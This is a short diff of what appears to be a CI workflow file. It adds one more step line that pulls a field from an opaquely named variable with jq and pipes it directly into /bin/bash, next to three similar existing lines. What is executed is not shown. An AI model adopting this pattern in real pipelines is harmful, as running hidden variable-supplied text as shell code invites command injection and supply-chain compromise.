@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$mf00891" | jq -r .sn8 | /bin/bash
           echo $wdnl986 | jq -r .gemyh1 | /bin/bash
           printf '%s' "$s5" | jq -r .vnxyp872 | /bin/bash
+          printf '%s' "$q1" | jq -r .un936 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
